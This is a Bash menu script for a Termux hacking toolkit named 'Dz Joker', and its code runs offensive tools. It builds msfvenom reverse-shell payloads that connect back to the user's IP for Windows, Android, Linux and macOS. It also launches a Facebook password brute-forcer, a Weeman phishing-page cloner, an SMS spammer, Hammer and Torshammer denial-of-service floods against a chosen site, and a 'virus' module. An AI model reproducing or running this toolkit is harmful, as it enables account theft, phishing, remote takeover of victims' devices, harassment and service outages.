clear
#colors
w='\e[97m'
g='\033[1;92m'
r='\033[1;91m'
a='\033[1;94m'
b='\e[1;4m'
cyan='\033[1;36m'
green='\033[1;32m'
green2='\033[0;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
g='\033[1;92m'
a='\033[1;94m'
b='\e[1;4m'
c='\033[1;36m'
c2='\033[0;36m'
r='\033[1;31m'
r2='\033[0;31m'
Y2='\033[0;33m'
b='\033[1;34m'
p='\033[1;35m'
eset='\033[0m'
G='\e[110m'
G1='\e[101m'
G2='\e[102m'
G3='\e[103m'
G4='\e[104m'
G5='\e[105m'
G6='\e[106m'
G7='\e[107m'
reset='\033[0m'
G='\e[110m'
G1='\e[101m'
o='\033[0m'
n=install
cd $HOME/dzjoker
clear
echo -e $c' ▄▄▄██▀▀▀▒█████   ▒█████   ██ ▄█▀▓█████  ██▀███ '
sleep 0.1
echo -e $w'   ▒██  ▒██▒  ██▒▒██▒  ██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒ '
sleep 0.1
echo -e $c'   ░██  ▒██░  ██▒▒██░  ██▒▓███▄░ ▒███   ▓██ ░▄█ ▒ '
sleep 0.1
echo -e $w'▓██▄██▓ ▒██   ██░▒██   ██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄ '
sleep 0.1
echo -e $c' ▓███▒ ░ ████▓▒░░ ████▓▒░▒██▒ █▄░▒████▒░██▓ ▒██▒ '
sleep 0.1
echo -e $c2' ▒▓▒▒░  ░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░ '
sleep 0.2
echo ' ▒ ░▒░    ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░ '
sleep 0.2
echo ' ░ ░ ░  ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░    ░     ░░   ░ '
sleep 0.2
echo ' ░   ░      ░ ░      ░ ░  ░  ░      ░  ░   ░ '
echo -e "$G1$w>>>>>>>>>>>>>>>>: INSTAll TOOLS :<<<<<<<<<<<<<<<<<$o"
echo -e ""$red"[$reset"01"$red]$c S TERMUX"$red"    [$reset"02"$red]$c FACEBOOK"$cyan"   $red[$reset"03"$red]$c INFORMATION"
sleep 0.1
echo -e $red"[$reset"04"$red]$c MSF_meta" $red"   [$reset"05"$red]$c WiFi HACK"$red"  [$reset"06"$red]$c PAttacks"
sleep 0.1
echo -e "$G1$w>>>>>>>>>>>>>>>>>>>: HACKING :<<<<<<<<<<<<<<<<<<<<$o"
sleep 0.1
echo -e ""$red"[$reset"07"$red]$c FACE HK"   $red"    [$reset"08"$red]$c NmapScan" $red"  [$reset"09"$red]$c Payload"
sleep 0.1
echo -e  $red"[$reset"10"$red]$c Ngrok"$red"       [$reset"11"$red]$c ViRuSs" $red"    [$reset"12"$red]$c DOS AttaCk"
python2 .m.py
echo -e "$c2"
read -p "PLEASE>>>ENTER>>>NUMBER>>>:~# " ali
st(){
cd /$HOME/dzjoker/.ster/
chmod +x *
./ster.sh
}
if [ "$ali" -eq "1" ]; then
         st
fi
####facebook
fc(){
cd /$HOME/dzjoker/.fc/
chmod +x .fc.sh
./.fc.sh
}
if [ "$ali" -eq "2" ]; then
         fc
fi
##########informa
inf(){
cd /$HOME/dzjoker/.inf/
chmod +x .inf.sh
./.inf.sh
}
if [ "$ali" -eq "3" ]; then
            inf
fi
##########meta
meta(){
cd /$HOME/dzjoker/.meta/
chmod +x .meta.sh
./.meta.sh
}
if [ "$ali" -eq "4" ]; then
            meta
fi
######()///#--_56
wi(){

cd /$HOME/dzjoker/.wifi/
chmod +x *
./wifi.sh
}
if [ "$ali" -eq "5" ]; then
            wi
fi
#######
pa(){
cd /$HOME/dzjoker/.dos/
chmod +x .dos.sh
./.dos.sh
}
if [ "$ali" -eq "6" ]; then
            pa
fi
###
HK(){
clear
echo -e "$red"
toilet -f big -F gay "HaCK.FaCe"
echo -e "$r[$w"1"$r]"$w"==>" "               $r[$w"4"$r]"$w"==>"
echo -e "       ""$G4$w OPEN$o"$r"=""$G4$w MAX   $o" "       ""$G5$w OPEN$o"$r"=""$G5$w CUPP Word LisT$o"
sleep 0.2
echo -e "$r[$w"2"$r]"$w"==>" "               $r[$w"5"$r]"$w"==>"
echo -e "       ""$G4$w OPEN$o"$r"=""$G4$w WEEMEN$o" "       ""$G5$w OPEN$o"$r"=""$G5$w Sabri Zaki$o"
sleep 0.2
echo -e "$r[$w"3"$r]"$w"==>" "               $r[$w"6"$r]"$w"==>"
echo -e "       ""$G4$w OPEN$o"$r"=""$G4$w FB.PY $o" "       ""$G5$w OPEN$o"$r"=""$G5$w Prove Your Self$o"
sleep 0.2
echo -e $red"                     ["$w"00"$red"]"$red "ExIT"
sleep 0.1
echo -e $red"	       	     ["$w"99"$red"]"$cyan "BaCk"
echo ""
echo -e "$red"
read -p "Please Enter NumBeR}}}>>:~# " hk
}
if [ "$ali" -eq "07" ]; then
   HK
fi
if [ "$hk" -eq "99" ]; then
./joker.sh
fi
if [ "$hk" -eq "00" ]; then
clear
exit
fi
if [ "$hk" -eq "1" ]; then
cd /$HOME/dzjoker
python2 .op.py
fi
if [ "$hk" -eq "4" ]; then
cd /$HOME/dzjoker/.cupp
clear
echo "Generat Targeted Wordlist"
python3 cupp3.py -i
clear
mkdir $HOME/WordList
mv $HOME/dzjoker/.cupp/*.txt $HOME/WordList
echo "Your Wordlist Saved at  $HOME/WordList"
cd $path
echo $C
ls | cat -n
echo
echo -n  $R"Press" ENTRE to back" "
read ENTRE
cd /$HOME/dzjoker
./jokery

fi
if [ "$hk" -eq "5" ]; then
clear
toilet -f mono12 -F gay "...By"
sleep 0.2
toilet -f mono12 -F gay "Sabri"
sleep 0.2
toilet -f mono12 -F gay "Zaki"
sleep 1
cd /$HOME/dzjoker
chmod +x .crunch
./.crunch
cd /$HOME/dzjoker
./joker.sh
fi
if [ "$hk" -eq "6" ]; then
clear
toilet -f mono12 -F gay "...By"
sleep 0.2
toilet -f mono12 -F gay "Prove"
sleep 0.2
toilet -f mono12 -F gay "..Your"
sleep 0.2
toilet -f mono12 -F gay "self"
sleep 1
cd /$HOME/dzjoker
python .w.py
cd /$HOME/dzjoker
./joker.sh
fi
##########
update(){
echo -e "$blue"
figlet  -f big "U P D ATE" 
sleep 1
figlet  -f big "....Now"
sleep 1
clear
figlet  -f big "U P D ATE"
sleep 1
cd
cd $HOME/dzjoker
chmod +x .setup.sh
./.setup.sh
}
if [ "$ali" -eq "55"  ]; then
        update
fi
################
hack(){
clear
echo -e " $G2$w ██████╗ ███████╗██╗  ██╗ █████╗  ██████╗██╗  ██╗$o"
sleep 0.1
echo -e " $G2$w ██╔══██╗╚══███╔╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝$o"
sleep 0.1
echo -e " $G2$w ██║  ██║  ███╔╝ ███████║███████║██║     █████╔╝ $o"
sleep 0.1
echo -e " $G2$w ██║  ██║ ███╔╝  ██╔══██║██╔══██║██║     ██╔═██╗ $o"
sleep 0.1
echo -e " $G2$w ██████╔╝███████╗██║  ██║██║  ██║╚██████╗██║  ██╗$o"
sleep 0.1
echo -e " $G2$w ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝$o"
echo -e "$green"
echo -e "{My IP}~~~>>>>>>>>>>>Đž_JøØKěŘ<<<<<<<<<<~~~{My IP}"
       curl ifconfig.me
echo -e "$blue"
ifconfig wlan0 | grep -o 192..........
echo -e  $red"["$green"1"$red"]"$w"==>"$red"		       ["$green"2"$red"]"$w"==>"
echo -e "      $G2$w PayloaD windows$o""        $G2$w PayloaD Android$o"
sleep 0.1
echo -e  $red"["$green"3"$red"]"$w"==>"$red" 	               ["$green"4"$red"]"$w"==>"
echo -e "      $G2$w PayloaD LINUX  $o""        $G2$w PayloaD Mac OS$o"
sleep 0.1
echo -e $red"["$green"5"$red"]"$w"==>"$red"      	       ["$green"6"$red"]"$w"==>"
echo -e "      $G2$w SeNT SMS$o""               $G2$w Payload Scrip$o"
sleep 0.1
echo -e $red"["$cyan"J"$green"o"$red"O"$reset"K"$blue"E"$purple"R"$red"]"$cyan">"$green">"$yellow">"$cyan">"$green">"$purple">"$reset">"$cyan">"$blue">"$green">"$purple">"$red"["$w"00"$red"]"$red "Exit" $cyan">"$green">"$yellow">"$cyan">"$green">"$purple">"$reset">"$cyan">"$blue">"$cyan">"$green">"$purple">"$red"["$green"99"$red"]"$cyan "BaCk"
sleep 0.1
echo -e "$gree"
read -p "Please Enter NuMbER:~# " joker
}
if [ "$ali" -eq "9"  ]; then
        hack
fi
if [ "$joker" -eq "00"  ]; then
clear
exit
fi
####################################
if [ "$joker" -eq "6"  ]; then
chmod +x .pys.sh
./.pys.sh
fi
#####################
face(){
clear
toilet -f mono12 -F gay "FACE"
sleep 1
cd
termux-open https://www.facebook.com/Alsantaresehhhhhhhhhhhhh
clear
echo -e "$yellow"
figlet  -f big "Dz JoOkeR"
echo "Please Enter Back<<<"
read back

$back clear
cd /$HOME/dzjoker
./joker.sh
}
if [ "$ali" -eq "99"  ]; then
        face
fi
##############
youtube(){
clear
echo -e "$red"
figlet  -f big " YOuTuBe"
sleep 1
cd
termux-open https://www.youtube.com/channel/UCqxMlxWaFTGypJq6nU7mGjA
clear
echo -e "$yellow"
figlet  -f big "Dz JoOkeR" 
echo "Please Enter Back<<<"
read back

$back clear
cd /$HOME/dzjoker
./joker.sh
}
if [ "$ali" -eq "88"  ]; then
        youtube
fi
##############

##########6#################
back(){
clear
echo -e "$cyan"
figlet -f big " B a C k"
echo "Please Enter Back To Dz JokeR<<<"
read back
$back clear
cd /$HOME/dzjoker
./joker.sh
}
if [ "$joker" -eq "99" ]; then
           back
fi
########878::8:8::8;77;(;(#__(;##
ex(){
clear
figlet -f big "TheEnND"
echo "Please Enter Exit <<<Goodbay>>>>"
read exit
$exit clear
clear
exit
clear
}
if [ "$ali" -eq "00" ]; then
           ex
fi
###722(;;(;;(;((;)8338;((!;';/;;/;/;/;/;;/;;/;
payw(){
clear
echo "$green"
figlet -f big "PaYloadW"
echo -e "$purple"
read -p "     Please Enter Your IP>>>>>> " ipp
sleep 2
read -p "    Please Enter Your PORT>>>>>>> " pp
sleep 2
read -p " Please Enter Name payload>>>>>>> " nn
cd
cd metasploit-framework
./msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipp LPORT=$pp -f exe e >  /sdcard/dzjoker/$nn.exe
echo -e "$cyan Path of the pyload-----> $yellow  /sdcard/dzjoker/$nn.exe"
echo -e "$purple end the payload+++++++++++++++++++++ "
sleep 2
cd $HOME/dzjoker
read -p "Please Enter To Back :~#You Go To sdcars/dzjoker"
cd /$HOME/dzjoker
./joker.sh
}
if [ "$joker" -eq "1" ]; then
           payw
fi
#)#);;);;);;(;(;((;/;;/;;//;/;///;;)
linux(){
clear
echo "$blue"
figlet -f big "PaYloadL"
echo -e "$red"
read -p "Please Enter Your IP>>>> " uu
sleep 2
read -p "   Please Enter Your PORT>>>>> " tt
sleep 2
read -p "     Please Enter Name Payload>>>>>> " mm
cd
cd metasploit-framework
./msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uu LPORT=$tt -f elf > /sdcard/dzjoker/$mm.elf
clear
echo -e "$cyan Path of the pyload--->$yellow  /sdcard/dzjoker/$n.elf"
echo -e "$purple end the payload+++++++++++++++++++++++ "
sleep 2
cd /$HOME/dzjoker
read -p "Please Enter To BaCk You Go sdcard/dzjoker"
./joker.sh
}
if [ "$joker" -eq "3" ]; then
           linux
fi
############66666
paym(){
clear
echo "$blue"
figlet -f big "PaYloadM"
echo -e "$cyan"
read -p "Please Enter Your IP>>>> " cc
sleep 1
read -p "    Please Enter Your PORT>>>>> " zz
sleep 1
read -p "      Please Enter Name Payload>>>>>>> " xx
cd
cd metasploit-framework
./msfvenom -p osx/x86/shell_reverse_tcp LHOST=$cc LPORT=$zz -f macho > /sdcard/dzjoker/$xx.macho
clear
echo -e "$cyan Path of the pyload----->  $yellow  /sdcard/dzjoker/$n.macho"
echo -e "$purple end the payload+++++++++++++++++++++++ "
sleep 2
cd $HOME/dzjoker
read -p "Please Enter To BaCk You Go sdcard/dzjoker"
./joker.sh
}
if [ "$joker" -eq "4" ]; then
           paym
fi
#########6
paya(){
clear
echo "$green"
figlet -f big "PaYloadA"
echo -e "$cyan"
read -p "Please Enter Your IP>>>>>> " ip
sleep 2
read -p "    Please Enter Your PORT>>>>>>> " p
sleep 2
read -p "      Please Enter Name Payload>>>>>>>>>> " n
cd $HOME/metasploit-framework
./msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$p R >  /sdcard/dzjoker/$n.apk
clear
echo -e "$cyan Path of the pyload----->  $yellow  /sdcard/dzjoker/$n.apk"
echo -e "$purple end the payload+++++++++++++++++++++++ "
sleep 2
cd $HOME/dzjoker
read -p "Please Enter To BaCk You Go sdcard/dzjoker"
./joker.sh
}
if [ "$joker" -eq "2" ]; then
           paya
fi
#################
book1(){
echo "green"
figlet -f big "HaCk FaCe1" 
echo -e "  $red         [1]add password        [0]back"
echo ""
echo -e " $green      id = E-mail "
echo "               password = password.txt "
read -p "            entat   " face
if [ "$face" -eq "1"  ]; then
nano $HOME/dzjoker/.facebook/password.txt
./joker.sh
elif [ "$face" -eq "0" ]; then
./joker.sh
else
pkg $n python2
pip2 install mechanize
clear
sh $HOME/dzjoker/.cxcxcx.sh
echo -e " $yellow                 password = password.txt"
echo -e "$green"
cd $HOME/dzjoker/.facebook
python2 $HOME/dzjoker/.facebook/facebook.py
sleep 1000000
$back clear
cd /$HOME/dzjoker
./joker.sh

fi

}

if [ "$hk" -eq "3" ]; then
           book1
fi
#############
face2(){
echo "green"
figlet -f big "HaCk URL" 
cd
rm $HOME/dzjoker/.weeman/core/shell.py
rm $HOME/dzjoker/.weeman/core/shell.pyc
cd $HOME/dzjoker
clear
chmod +x .bvbv.sh
sh .bvbv.sh
echo -e "$green"
echo -e "=================>{$blue facebook$green }<==============="
echo -e "$cyan                    set url "
echo -e "$cyan                 set action_url "
read -p "    entar " max

if [ "$max" -eq "0"  ]; then
./joker.sh
else
cp $HOME/dzjoker/.max/shellf.py $HOME/dzjoker/.weeman/core/shell.py
cd $HOME/dzjoker/.weeman/
python2 weeman.py
$back clear
cd /$HOME/dzjoker
./joker.sh

fi

}

if [ "$hk" -eq "2" ]; then
           face2
fi
#####((((((((
ssms(){
pkg $n python2
clear
toilet -f mono12 -F gay "SENTt"
cd $HOME/dzjoker/.Spammer-Grab
echo -e "$cyan"
read -p "PleaSe>>>Enter>>>NuMbeR>>> " f
python2 spammer.py --delay 30 $f
cd ..
./joker.sh
}
if [ "$joker" -eq "5" ]; then
           ssms
fi
##########77777777
free(){
clear
#banne
echo -e "  $G2$r ██████  ██████   ██████$w Show___Attack$r ███████ $o"
echo -e "  $G2$r ██   ██ ██   ██ ██    ██$w attack web  $r ██      $o"
echo -e "  $G2$r ██   ██ ██   ██ ██    ██$w Site Go Now $r ███████ $o"
echo -e "  $G2$r ██   ██ ██   ██ ██    ██$Y2 By:Muhammed Hanfy$r ██ $o"
echo -e "  $G2$r ██████  ██████   ██████$Y2 Welcome  ^_^ $r ███████ $o"
echo " "
echo -e  $red"  ["$green"1"$red"]"$w"==>"
echo -e "        $G1$w Dos Attack$o"$r" ==>"$c2 "Hammer"
echo -e  $red"  ["$green"2"$red"]"$w"==>"
echo -e "        $G1$w Dos Attack$o"$r" ==>"$c2"TorShammer"
sleep 0.2
echo -e $red"                ["$w"00"$red"]"$red "ExIT"
sleep 0.1
echo -e $red"                ["$w"99"$red"]"$cyan "BaCk"
echo " "
echo -e "$red"
read -p "Please Enter NumBeR}}}>>:~# " dome
}
if [ "$ali" -eq "12" ]; then
           free
fi
xback(){
clear
echo "          Please Enter Back To Dz JokeR<<<"
read back
$back clear
cd /$HOME/dzjoker
./joker.sh
}
if [ "$dome" -eq "99" ]; then
           xback
fi
if [ "$dome" -eq "00" ]; then
clear
exit
fi
##(########888888
Dos(){
clear
echo -e "$green"
figlet -f big "  Hammer"
read -p "    {IP}<~>{LINK}>>>>" ip
read -p "    {PORT}<~>{80}>>>>>>" pr
read -p "    {Time in seconds}>>>>>" ti
pkg $n python
clear
echo -e "$green"
cd .hammer
chmod +x hammer.py
python hammer.py -s $ip -p $pr -t $ti
$back clear
cd /$HOME/dzjoker
./joker.sh
}
if [ "$dome" -eq "1" ]; then
           Dos
fi
#hhfsdhgssseeeeeeewww
shamer(){
clear
toilet -f big -F gay "Dos Tor"
echo -e "$Y2              Please open 3tap or 2 ^_+ "
echo -e "$r"
read -p "Enter Web Site~: " site
python2 .torshammer/torshammer.py --tor -t $site -r 256 -T
cd /$HOME/dzjoker
./joker.sh
}
if [ "$dome" -eq "2" ]; then
           shamer
fi
################9999
if [ "$ali" -eq "00" ]; then
clear
exit
fi
#######
vir(){
cd /$HOME/dzjoker/.viros/
chmod +x .vir.sh
./.vir.sh
}
if [ "$ali" -eq "11" ]; then
            vir
fi
###
##########
ng(){
cd /$HOME/dzjoker/.ngrok/
chmod +x ng.sh
./ng.sh
}

if [ "$ali" -eq "10" ]; then
            ng
fi
#############
nm(){
cd /$HOME/dzjoker/.nm/
chmod +x nm.sh
./nm.sh
}

if [ "$ali" -eq "8" ]; then
            nm
fi
